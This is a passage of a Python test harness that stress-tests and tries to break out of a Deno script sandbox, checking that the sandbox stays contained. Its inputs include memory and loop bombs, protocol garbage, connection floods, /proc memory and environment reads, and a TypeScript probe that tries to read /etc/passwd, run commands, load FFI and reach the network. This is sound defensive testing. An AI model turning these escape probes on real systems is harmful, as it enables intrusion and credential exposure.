        "and the four that were running finish",
        None if all(r.stage == "done" for r in results) else str([r.stage for r in results]),
    )
    outcome = await run_script(target, "return 2;")
    report.line(
        "and a sixth run is served afterwards", only(outcome, lambda r: None if r == 2 else str(r))
    )


async def peak_usage(container: str, stop: asyncio.Event) -> tuple[int, int]:
    """The most processes and bytes of memory the container's cgroup held while `stop` was unset."""
    command = (
        "cat /sys/fs/cgroup/pids.current /sys/fs/cgroup/memory.current 2>/dev/null"
        " || cat /sys/fs/cgroup/pids/pids.current /sys/fs/cgroup/memory/memory.usage_in_bytes"
    )
    most_pids = most_memory = 0
    while not stop.is_set():
        _, out = await docker_exec(container, "sh", "-c", command)
        numbers = out.split()
        if len(numbers) >= 2 and all(word.isdigit() for word in numbers[:2]):
            most_pids, most_memory = (
                max(most_pids, int(numbers[0])),
                max(most_memory, int(numbers[1])),
            )
        await asyncio.sleep(0.4)
    return most_pids, most_memory


async def bombs_at_once(target: Target, report: Report) -> None:
    stop = asyncio.Event()
    sampler = asyncio.create_task(peak_usage(target.container, stop)) if target.container else None
    heap = "const keep: unknown[] = [];\nwhile (true) keep.push(new Array(1e6).fill(1));"
    big = "const keep: Uint8Array[] = [];\nwhile (true) keep.push(new Uint8Array(40e6).fill(1));"
    bombs = await asyncio.gather(
        *(run_script(target, code, timeout=20) for code in (heap, heap, big, big))
    )
    stages = [outcome.stage for outcome in bombs]
    report.line(
        "two heap bombs and two off-heap bombs at once are all stopped",
        None if all(stage in ("memory", "error") for stage in stages) else str(stages),
        f"{stages}, {max(o.seconds for o in bombs):.1f} s",
    )
    loops = await asyncio.gather(
        *(run_script(target, "let a = 0; while (true) { a++; }", timeout=4) for _ in range(4))
    )
    report.line(
        "four endless loops at once are all killed at the time limit",
        None if all(o.stage == "time" for o in loops) else str([o.stage for o in loops]),
    )
    trivial = await asyncio.gather(*(run_script(target, f"return {n};") for n in range(4)))
    report.line(
        "four trivial runs at once all answer",
        None
        if [o.final.get("result") for o in trivial] == [0, 1, 2, 3]
        else str([o.stage for o in trivial]),
        f"{max(o.seconds for o in trivial) * 1000:.0f} ms for the slowest",
    )
    stop.set()
    if sampler is not None:
        most_pids, most_memory = await sampler
        report.line(
            "the container stays inside its limits (128 processes, 768 MB) under all of that",
            None
            if most_pids < 128 and most_memory < 768 * MIB
            else f"{most_pids} processes, {most_memory} bytes",
            f"peak {most_pids} processes, {most_memory // MIB} MB",
        )


async def timed_pings(target: Target, work: Awaitable[Outcome]) -> tuple[Outcome, float, int]:
    """Do `work` while pinging the supervisor on other connections: its result, the slowest answer."""
    stop = asyncio.Event()

    async def pinger() -> tuple[float, int]:
        worst, count = 0.0, 0
        while not stop.is_set():
            started = time.monotonic()
            answer = await ping(target)
            worst = max(worst, time.monotonic() - started if answer else 99.0)
            count += 1
            await asyncio.sleep(0.05)
        return worst, count

    task = asyncio.create_task(pinger())
    try:
        result = await work
    finally:
        stop.set()
    worst, count = await task
    return result, worst, count


async def hostile_output(target: Target, report: Report) -> None:
    """Scripts that make Deno print the script back, a megabyte of it, in an error message."""
    idle = await timed_pings(target, run_script(target, "return 1;"))
    report.note(
        f"a ping on an idle supervisor takes {idle[1] * 1000:.0f} ms (through the connection used here)"
    )
    cases = [
        (
            "1 MB of spaces in a type position",
            'let a: typeof import("' + " " * 1_000_000 + 'x");\nreturn 1;',
        ),
        ("a 1 MB identifier", "const v = " + "a" * 1_000_000 + ";\nreturn 1;"),
        ("a 1 MB property name", "return vrum." + "c" * 1_000_000 + ";"),
        ("a 1 MB type name", "let v: " + "T" * 1_000_000 + ";\nreturn 1;"),
        (
            "a 1 MB string where a number is wanted",
            'const v: number = "' + "b" * 1_000_000 + '";\nreturn 1;',
        ),
        (
            "a 1 MB tab and quote run in a type position",
            'let a: typeof import("' + "\t'" * 500_000 + 'x");\nreturn 1;',
        ),
    ]
    for name, code in cases:
        outcome, worst, count = await timed_pings(target, run_script(target, code, timeout=20))
        problem = expect(outcome, "types", contains=("Line 1:",))
        if problem is None and len(str(outcome.final["message"])) > 1500:
            problem = f"the message is {len(str(outcome.final['message']))} characters"
        if problem is None and outcome.seconds > 6:
            problem = f"took {outcome.seconds:.1f} s"
        if problem is None and worst >= 1.0:
            problem = f"a ping waited {worst:.2f} s"
        report.line(
            f"{name}: a normal types failure, and a ping answers at once",
            problem,
            f"{outcome.seconds:.1f} s, slowest of {count} pings {worst * 1000:.0f} ms",
        )


def big_replies(size: int, delay: float = 0.0) -> Answer:
    def answer(call: Message) -> tuple[bool, Any, float]:
        return True, {"data": "x" * size}, delay

    return answer


async def supervisor_rss_mb(container: str) -> int:
    code = (
        "import os\nfor p in os.listdir('/proc'):\n"
        "    if p.isdigit():\n"
        "        try:\n            cmd = open(f'/proc/{p}/cmdline').read()\n"
        "        except OSError:\n            continue\n"
        "        if cmd == 'python\\0/sandbox/supervisor.py\\0':\n"
        "            for line in open(f'/proc/{p}/status'):\n"
        "                if line.startswith('VmRSS'):\n                    print(int(line.split()[1]) // 1024)\n"
    )
    _, out = await docker_exec(container, "python", "-c", code)
    return int(out.split()[0]) if out.split() else -1


BUSY_AFTER_CALLS = (
    "const pending = Array.from({ length: 150 }, (_, i) => vrum.echo({ i }));\n"
    "await new Promise((r) => setTimeout(r, 300));\n"
    "const end = Date.now() + 60000;\nwhile (Date.now() < end) {}\nreturn pending.length;"
)


async def stuck_scripts(target: Target, report: Report) -> None:
    """A script that sends many calls and then stops reading: the supervisor must not wait for it."""
    stop = asyncio.Event()
    sampler = asyncio.create_task(peak_rss(target.container, stop)) if target.container else None
    outcome, worst, count = await timed_pings(
        target, run_script(target, BUSY_AFTER_CALLS, timeout=60, answer=big_replies(900 * 1024))
    )
    stop.set()
    problem = expect(outcome, "limit", contains=("not reading the replies",))
    if problem is None and outcome.seconds > 8:
        problem = f"took {outcome.seconds:.1f} s"
    if problem is None and worst >= 1.0:
        problem = f"a ping waited {worst:.2f} s"
    report.line(
        "150 calls answered with 900 KB each, then a busy loop: ended as a limit at once, in words",
        problem,
        f"{outcome.seconds:.1f} s, slowest of {count} pings {worst * 1000:.0f} ms",
    )
    if sampler is not None:
        peak = await sampler
        report.line(
            "and the supervisor never held much memory for it",
            None if 0 < peak < 200 else f"peak {peak} MB",
            f"supervisor peak {peak} MB",
        )
    report.line(
        "its slot and its process are free at once",
        None if await slots_free(target) else "a slot is still taken",
    )

    def small_slow_replies(call: Message) -> tuple[bool, Any, float]:
        return True, {"data": "y" * 2048}, 1.0

    link = await open_link(target)
    try:
        request: Message = {
            "op": "run",
            "id": "stuck",
            "code": BUSY_AFTER_CALLS,
            "functions": FUNCTIONS,
            "declarations": DECLARATIONS,
            "timeout": 60,
        }
        await link.send(request)
        answers: list[asyncio.Task[None]] = []
        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline:
            try:
                message = await link.receive(max(deadline - time.monotonic(), 0.1))
            except TimeoutError:
                break
            if message is None:
                break
            if message["op"] == "call":
                answers.append(asyncio.create_task(reply_later(link, message, small_slow_replies)))
        await asyncio.sleep(1.5)
        started = time.monotonic()
        await link.send({"op": "cancel"})
        try:
            closed = await link.receive(5) is None
        except TimeoutError:
            closed = False
        took = time.monotonic() - started
        for task in answers:
            task.cancel()
        report.line(
            "a cancel sent while the script is busy and its pipe is full is handled within a second",
            None if closed and took < 1.5 else f"closed {closed} after {took:.1f} s",
            f"connection closed {took:.2f} s after the cancel ({len(answers)} calls had been sent)",
        )
    finally:
        await link.close()
    report.line(
        "and its slot is free: four runs start at once, a fifth is refused, then it is served",
        None if await slots_free(target) else "a slot is still taken",
    )
    outcome = await run_script(
        target,
        "const rs = await Promise.all(Array.from({ length: 10 }, (_, i) => vrum.echo({ i })));\n"
        "return rs.map((r) => (r as any).data.length);",
        answer=big_replies(900 * 1024),
    )
    report.line(
        "ten calls at once answered with 900 KB each still work (no false alarm)",
        only(outcome, lambda r: None if r == [900 * 1024] * 10 else str(r)),
    )


async def peak_rss(container: str | None, stop: asyncio.Event) -> int:
    peak = 0
    while container and not stop.is_set():
        peak = max(peak, await supervisor_rss_mb(container))
        await asyncio.sleep(0.3)
    return peak


async def slots_free(target: Target) -> bool:
    """All four slots are free: four holding runs are all admitted and a fifth is refused as busy."""
    hold = "await new Promise((r) => setTimeout(r, 1500));\nreturn 1;"
    first = [asyncio.create_task(run_script(target, hold, timeout=20)) for _ in range(4)]
    await asyncio.sleep(1.0)
    fifth = await run_script(target, "return 1;")
    results = await asyncio.gather(*first)
    sixth = await run_script(target, "return 2;")
    return (
        all(o.stage == "done" for o in results)
        and fifth.stage == "sandbox"
        and "busy" in fifth.text
        and sixth.stage == "done"
    )


async def isolation(target: Target, report: Report) -> None:
    """Runs share a user, so each run keeps what it can from the others (nothing needs a capability)."""
    container = target.container
    if container is None:
        report.skip("isolation between runs", "needs --container")
        return
    marker = "UNIQUEMARKERISOLATION"
    code = f'const {marker} = "{marker.lower()}text";\nconst end = Date.now() + 4000;\nwhile (Date.now() < end) {{}}\nreturn {marker};'
    run = asyncio.create_task(run_script(target, code, timeout=20))
    await asyncio.sleep(2.5)
    probe = (
        "import os\n"
        "for p in sorted(int(x) for x in os.listdir('/proc') if x.isdigit()):\n"
        "    try:\n        cmd = open(f'/proc/{p}/cmdline').read()\n"
        "    except OSError:\n        continue\n"
        "    kind = 'deno' if cmd.startswith('/usr/local/bin/deno') and 'runner.ts' in cmd else ('supervisor' if cmd == 'python\\0/sandbox/supervisor.py\\0' else None)\n"
        "    if not kind:\n        continue\n"
        "    for name in ('environ', 'mem', 'fd', 'maps', 'smaps'):\n"
        "        path = f'/proc/{p}/{name}'\n"
        "        try:\n"
        "            if name == 'fd':\n                os.listdir(path)\n"
        "            else:\n                open(path, 'rb').read(16)\n"
        "            print(kind, name, 'OPENED')\n"
        "        except PermissionError:\n            print(kind, name, 'refused')\n"
        "        except OSError as e:\n            print(kind, name, 'OPENED-then-' + e.__class__.__name__)\n"
    )
    _, out = await docker_exec(container, "python", "-c", probe)
    seen = [line.split() for line in out.splitlines() if line.strip()]
    kinds = {row[0] for row in seen}
    opened = [" ".join(row) for row in seen if row[2] != "refused"]
    report.line(
        "another process of the same user cannot open the memory, descriptors or environment of a script's process or of the supervisor",
        None
        if kinds == {"deno", "supervisor"} and not opened
        else f"kinds {kinds}, opened {opened}",
        f"{len(seen)} attempts, all refused",
    )
    _, listing = await docker_exec(
        container,
        "sh",
        "-c",
        f"grep -rl {marker.lower()}text /tmp /deno 2>/dev/null; echo ---; ls /tmp /deno; echo ---; find /tmp /deno -type f | head",
    )
    holds, tree, files = listing.split("---")
    report.line(
        "while a script runs, nothing of its text is on disk in /tmp or /deno",
        None if not holds.strip() else f"found in {holds.split()}",
        f"files on disk during the run: {len(files.split())}",
    )
    _, descriptors = await docker_exec(
        container,
        "sh",
        "-c",
        "for p in /proc/[0-9]*; do if tr '\\0' ' ' < $p/cmdline | grep -q 'runner.ts'; then ls -l $p/fd 2>&1 | awk '{print $NF}'; fi; done",
    )
    odd = [
        line
        for line in descriptors.split()
        if line.startswith("socket:") or "/run/sandbox" in line or "/tmp/run-" in line
    ]
    report.line(
        "a script's process holds no socket and no file of the supervisor's",
        None
        if not odd and descriptors.strip()
        else f"descriptors {sorted(set(descriptors.split()))}",
        f"{len(descriptors.split())} descriptors, none a socket",
    )
    await run
    _, leftovers = await docker_exec(container, "sh", "-c", "ls -A /tmp /deno")
    report.line(
        "when the run is over /tmp and /deno are empty again",
        None if not leftovers.replace("/tmp:", "").replace("/deno:", "").strip() else leftovers,
    )


async def evil_apps(target: Target, report: Report) -> None:
    link = await open_link(target)
    try:
        await link.send(
            {
                "op": "run",
                "id": "evil",
                "code": "const a = await vrum.echo({ n: 1 });\nreturn a;",
                "functions": FUNCTIONS,
                "declarations": DECLARATIONS,
                "timeout": 10,
            }
        )
        call = await link.receive(30)
        assert call is not None and call["op"] == "call"
        await link.send_raw(b"this is not json\n")
        await link.send({"op": "reply", "seq": 99, "ok": True, "result": 1})
        await link.send({"op": "nonsense"})
        await link.send({"op": "reply", "seq": call["seq"], "ok": True, "result": {"n": 1}})
        await link.send({"op": "reply", "seq": call["seq"], "ok": True, "result": {"n": 2}})
        final = await link.receive(30)
        ok = final is not None and final["op"] == "done" and final["result"] == {"n": 1}
        report.line(
            "an app sending garbage, unknown and repeated replies is ignored",
            None if ok else str(final),
        )
    finally:
        await link.close()
    link = await open_link(target)
    try:
        await link.send(
            {
                "op": "run",
                "id": "evil2",
                "code": "while (true) {}",
                "functions": [],
                "declarations": "",
                "timeout": 60,
            }
        )
        await asyncio.sleep(1.5)
        await link.send({"op": "cancel"})
        final = await link.receive(5)
        report.line(
            "a cancel stops the run and the connection closes",
            None if final is None else str(final),
        )
    finally:
        await link.close()
    link = await open_link(target)
    try:
        await link.send_raw(b"\x00\xff not json at all\n")
        final = await link.receive(5)
        report.line(
            "garbage instead of a request is answered in words",
            expect(Outcome(final or {}, [], 0), "sandbox", contains=("not understood",)),
        )
    finally:
        await link.close()
    link = await open_link(target)
    try:
        await link.send(
            {
                "op": "run",
                "id": "x",
                "code": "return 1;",
                "functions": ["ok", "not valid!"],
                "declarations": "",
            }
        )
        final = await link.receive(5)
        report.line(
            "a run with a bad function name is refused in words",
            expect(Outcome(final or {}, [], 0), "sandbox", contains=("functions",)),
        )
    finally:
        await link.close()
    link = await open_link(target)
    try:
        await link.send(
            {
                "op": "run",
                "id": "x",
                "code": "return 1;",
                "functions": [],
                "declarations": "",
                "timeout": 100000,
            }
        )
        final = await link.receive(5)
        report.line(
            "a time limit above the maximum is refused in words",
            expect(Outcome(final or {}, [], 0), "sandbox", contains=("timeout",)),
        )
    finally:
        await link.close()
    link = await open_link(target)
    try:
        try:
            await link.send_raw(b"x" * (5 * MIB) + b"\n")
            final = await link.receive(10)
        except (ConnectionError, TimeoutError):
            final = None
        report.line(
            "a line of 5 MiB closes the connection", None if final is None else str(final)[:200]
        )
    finally:
        await link.close()
    answer = await ping(target)
    report.line(
        "the supervisor still answers after all of that",
        None if answer and answer["op"] == "pong" else str(answer),
    )


SNIPPET_MANY = r"""
import json, socket, sys, time
path = sys.argv[1]
held = []
for _ in range(150):
    s = socket.socket(socket.AF_UNIX); s.connect(path); held.append(s)
answer = {"op": "no answer"}
for _ in range(20):
    try:
        s = socket.socket(socket.AF_UNIX); s.settimeout(5); s.connect(path); s.sendall(b'{"op":"ping"}\n')
        answer = json.loads(s.makefile("rb").readline())
        break
    except OSError:
        time.sleep(0.2)
print(json.dumps({"answer": answer["op"], "held": len(held)}))
"""


async def snippet(target: Target, code: str) -> str:
    argv = [
        "python",
        "-c",
        code,
        "/run/sandbox/run.sock" if target.container else str(target.socket),
    ]
    if target.container:
        status, out = await docker_exec(target.container, *argv)
        return out if status == 0 else f"exit {status}: {out}"
    process = await asyncio.create_subprocess_exec(
        sys.executable, *argv[1:], stdout=asyncio.subprocess.PIPE
    )
    out_bytes, _ = await process.communicate()
    return out_bytes.decode()


async def connections(target: Target, report: Report) -> None:
    answer = await snippet(target, SNIPPET_MANY)
    report.line(
        "150 idle connections do not stop the next ping",
        None if '"answer": "pong"' in answer else answer,
        answer.strip(),
    )
    link = await open_link(target)
    started = time.monotonic()
    try:
        final = await link.receive(20)
    except TimeoutError:
        final = {"op": "still open"}
    waited = time.monotonic() - started
    await link.close()
    report.line(
        "a client that sends nothing is dropped after about 10 s",
        None if final is None and 8 < waited < 14 else f"{final} after {waited:.1f} s",
        f"{waited:.1f} s",
    )


async def processes(container: str) -> list[str]:
    code = "import os; print(' '.join(open(f'/proc/{p}/comm').read().strip() for p in os.listdir('/proc') if p.isdigit()))"
    _, out = await docker_exec(container, "python", "-c", code)
    return out.split()


async def inside(target: Target, report: Report) -> None:
    container = target.container
    if container is None:
        for name in ("a disconnect mid-run kills the script's processes", "inside the container"):
            report.skip(name, "needs --container")
        return
    link = await open_link(target)
    await link.send(
        {
            "op": "run",
            "id": "gone",
            "code": "while (true) {}",
            "functions": [],
            "declarations": "",
            "timeout": 60,
        }
    )
    await asyncio.sleep(2)
    running = (await processes(container)).count("deno")
    await link.close()
    await asyncio.sleep(1.5)
    after = await processes(container)
    _, listing = await docker_exec(container, "ls", "/tmp")
    report.line(
        "a client that disconnects mid-run: its Deno is killed and its folder removed",
        None
        if running >= 1 and after.count("deno") == 0 and "run-" not in listing
        else f"deno before {running}, after {after.count('deno')}, /tmp {listing.split()}",
    )
    status, out = await docker_exec(
        container, "sh", "-c", "test ! -e /tmp/pwned && test ! -e /pwned && echo clean"
    )
    report.line(
        "nothing was written to /tmp or / by the file attacks", None if "clean" in out else out
    )
    _, net = await docker_exec(
        container,
        "sh",
        "-c",
        "for i in /sys/class/net/*; do [ -f $i/flags ] && echo $(basename $i) $(cat $i/flags); done",
    )
    flags = {line.split()[0]: int(line.split()[1], 16) for line in net.splitlines() if line.strip()}
    up = sorted(name for name, bits in flags.items() if bits & 1)
    _, routes = await docker_exec(container, "cat", "/proc/net/route")
    report.line(
        "the container has no network but loopback: one interface is up, and it has no route",
        None if up == ["lo"] and len(routes.splitlines()) == 1 else f"up {up}, routes {routes!r}",
        f"up: {up}; {len(flags) - 1} other kernel stubs are down" if len(flags) > 1 else "only lo",
    )
    code = "import socket\ns = socket.socket(); s.settimeout(3)\ntry:\n    s.connect(('1.1.1.1', 53)); print('CONNECTED')\nexcept OSError as e:\n    print('refused:', e)"
    _, out = await docker_exec(container, "python", "-c", code)
    report.line("it cannot connect to the internet", None if "refused" in out else out, out.strip())
    _, out = await docker_exec(
        container, "python", "-c", "import os; print(os.getuid(), os.getgid())"
    )
    report.line("it runs as uid 10002", None if out.split()[0] == "10002" else out, out.strip())
    code = "import os\nfor p in os.listdir('/proc'):\n    if p.isdigit():\n        s = open(f'/proc/{p}/status').read()\n        n = s.split('Name:')[1].split()[0]\n        if n in ('python', 'python3'):\n            print(n, [l.split()[1] for l in s.splitlines() if l.startswith('Uid:')][0])"
    _, out = await docker_exec(container, "python", "-c", code)
    uids = {line.split()[1] for line in out.splitlines() if line.strip()}
    report.line(
        "every process in it runs as uid 10002", None if uids == {"10002"} else str(uids), str(uids)
    )
    _, out = await docker_exec(
        container, "sh", "-c", "touch /x 2>&1; touch /sandbox/x 2>&1; touch /usr/x 2>&1; echo done"
    )
    report.line(
        "the root file system is read-only",
        None if out.count("Read-only file system") == 3 else out,
        "touch / /sandbox /usr refused",
    )
    _, out = await docker_exec(
        container,
        "sh",
        "-c",
        "grep -E 'CapEff|CapPrm|NoNewPrivs|Seccomp:' /proc/1/status /proc/self/status",
    )
    capabilities = [
        line.split()[-1] for line in out.splitlines() if "CapEff" in line or "CapPrm" in line
    ]
    no_new_privs = [line.split()[-1] for line in out.splitlines() if "NoNewPrivs" in line]
    report.line(
        "no capabilities and no-new-privileges",
        None if set(capabilities) <= {"0000000000000000"} and set(no_new_privs) == {"1"} else out,
        "CapEff and CapPrm are zero",
    )
    _, out = await docker_exec(
        container,
        "sh",
        "-c",
        "env; ls -la /secrets /run/secrets /var/run/docker.sock /run/sandbox 2>&1",
    )
    names = sorted(
        line.split("=")[0] for line in out.splitlines() if "=" in line and not line.startswith(" ")
    )
    harmless = {
        "HOSTNAME",
        "HOME",
        "PATH",
        "LANG",
        "PWD",
        "PYTHON_VERSION",
        "PYTHON_SHA256",
        "GPG_KEY",
        "PYTHONUNBUFFERED",
        "PYTHONDONTWRITEBYTECODE",
        "SHLVL",
        "_",
    }
    stray = [name for name in names if name not in harmless]
    problem = None
    if stray or out.count("No such file") < 3:
        problem = f"unexpected variables {stray} or files: {out[:400]}"
    report.line(
        "no secret in the environment and no secret or Docker files on the disk",
        problem,
        f"{len(names)} variables, all from the base image (GPG_KEY is Python's public signing key)",
    )
    _, out = await docker_exec(container, "sh", "-c", "ls /run/sandbox; df -h /tmp /deno | tail -2")
    report.line(
        "the socket's folder holds only the socket",
        None if out.split("\n")[0].strip() == "run.sock" else out,
        out.split("\n")[0],
    )


PERMISSION_PROBE = r"""
const out: Record<string, string> = {};
async function attempt(name: string, work: () => unknown) {
  try { await work(); out[name] = "ALLOWED"; } catch (e) { out[name] = (e as Error).name + ": " + String((e as Error).message).slice(0, 70); }
}
await attempt("read", () => Deno.readTextFile("/etc/passwd"));
await attempt("read dir", async () => { for await (const _ of Deno.readDir("/")) break; });
await attempt("write", () => Deno.writeTextFile("/tmp/probe-wrote", "x"));
await attempt("net connect", () => Deno.connect({ hostname: "1.1.1.1", port: 80 }));
await attempt("net listen", () => Deno.listen({ port: 8123 }));
await attempt("fetch", () => fetch("http://1.1.1.1/"));
await attempt("env", () => Deno.env.toObject());
await attempt("run a command", () => new Deno.Command("id").output());
await attempt("sys", () => Deno.hostname());
await attempt("ffi", () => Deno.dlopen("libc.so.6", {}));
await attempt("import https", () => import("https://example.com/x.js"));
await attempt("import file", () => import("file:///etc/passwd"));
await attempt("import data module reading a file", () => import("data:text/javascript,import x from 'file:///etc/passwd';export default x"));
await attempt("import npm", () => import("npm:left-pad"));
await attempt("import jsr", () => import("jsr:@std/path"));
for (const name of ["zlib", "vm", "child_process", "fs", "os", "module", "worker_threads", "net", "process", "crypto", "http", "dns", "sqlite", "test"]) {
  try { const m = await import("node:" + name); out["node:" + name] = Object.keys(m).length === 0 ? "empty" : "HAS " + Object.keys(m).length + " EXPORTS"; } catch (e) { out["node:" + name] = "error " + (e as Error).message.slice(0, 40); }
}
console.log(JSON.stringify(out));
"""

PROBE_PREPARE = (
    "import json\nm = json.load(open('/sandbox/import_map.json'))\n"
    "m['imports']['file:///tmp/probe.ts'] = 'file:///tmp/probe.ts'\n"
    "json.dump(m, open('/tmp/probe_map.json', 'w'))\n"
)


async def permission_layer(target: Target, report: Report) -> None:
    """If a script found `Deno` in spite of the runner, Deno itself must still refuse everything."""
    container = target.container
    if container is None:
        report.skip(
            "Deno's own permissions refuse everything (the layer under the runner)",
            "needs --container",
        )
        return
    await docker_exec(container, "sh", "-c", "cat > /tmp/probe.ts", stdin=PERMISSION_PROBE)
    await docker_exec(container, "python", "-c", PROBE_PREPARE)
    flags = [
        "--no-prompt",
        "--no-remote",
        "--no-npm",
        "--no-config",
        "--no-lock",
        "--cached-only",
        "--import-map=/tmp/probe_map.json",
    ]
    status, out = await docker_exec(
        container, "env", "DENO_DIR=/deno", "deno", "run", *flags, "/tmp/probe.ts"
    )
    await docker_exec(container, "sh", "-c", "rm -f /tmp/probe.ts /tmp/probe_map.json")
    try:
        results: dict[str, str] = json.loads(out.strip().splitlines()[-1])
    except (ValueError, IndexError):
        report.line(
            "Deno's own permissions refuse everything (the layer under the runner)",
            f"the probe did not run: {out[:400]}",
        )
        return
    for name, what in results.items():
        if name.startswith("node:"):
            problem = None if what == "empty" else what
            report.line(f"{name} is an empty module under the import map", problem)
        else:
            denied = (
                what.startswith(("NotCapable", "PermissionDenied"))
                or "Requires" in what
                or "specifier was requested" in what
                or "npm specifiers" in what
                or "Module not found" in what
                or "Unsupported scheme" in what
                or "not a dependency" in what
                or "JSR package" in what
            )
            report.line(
                f"Deno itself refuses: {name}",
                None if denied and "ALLOWED" not in what else what,
                what[:60],
            )


async def measure(target: Target, report: Report) -> None:
    async def timed(code: str, **limits: Any) -> float:
        outcome = await run_script(target, code, **limits)
        if outcome.stage != "done":
            raise RuntimeError(outcome.text[:300])
        return outcome.seconds * 1000

    await timed("return 1;")
    trivial = [await timed("return 1;") for _ in range(7)]
    sequential = [
        await timed("for (let i = 0; i < 50; i++) await vrum.echo({ i });\nreturn 1;")
        for _ in range(3)
    ]
    parallel = [
        await timed(
            "await Promise.all(Array.from({ length: 50 }, (_, i) => vrum.echo({ i })));\nreturn 1;"
        )
        for _ in range(3)
    ]
    report.note(
        f"MEASURE a trivial run, end to end: median {statistics.median(trivial):.0f} ms (best {min(trivial):.0f}, worst {max(trivial):.0f}, n=7)"
    )
    report.note(
        f"MEASURE 50 calls one after another: median {statistics.median(sequential):.0f} ms"
    )
    report.note(
        f"MEASURE 50 calls at once (Promise.all): median {statistics.median(parallel):.0f} ms"
    )


async def main(target: Target) -> int:
    report = Report()
    answer = await ping(target)
    if not answer or answer.get("op") != "pong":
        print(f"FAIL  the sandbox does not answer a ping: {answer}")
        return 1
    print(f"The sandbox answers: {answer}")
    await lines_of_attacks(target, report)
    await builtins_and_globals(target, report)
    await limits_and_loops(target, report)
    await output_limits(target, report)
    await errors_and_lines(target, report)
    await hostile_text(target, report)
    await five_at_once(target, report)
    await bombs_at_once(target, report)
    await hostile_output(target, report)
    await stuck_scripts(target, report)
    await isolation(target, report)
    await evil_apps(target, report)
    await connections(target, report)
    await inside(target, report)
    await permission_layer(target, report)
    await measure(target, report)
    answer = await ping(target)
    report.line(
        "and at the very end the sandbox still answers",
        None if answer and answer.get("op") == "pong" else str(answer),
    )
    print(f"\n{report.count - len(report.failed)} passed, {len(report.failed)} failed")
    for name in report.failed:
        print(f"  FAILED: {name}")
    return 1 if report.failed else 0


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    where = parser.add_mutually_exclusive_group(required=True)
    where.add_argument(
        "--container", help="name of the running sandbox container (uses docker exec)"
    )
    where.add_argument("--socket", help="path of the sandbox's Unix socket on this machine")
    arguments = parser.parse_args()
    sys.exit(asyncio.run(main(Target(arguments.socket, arguments.container))))
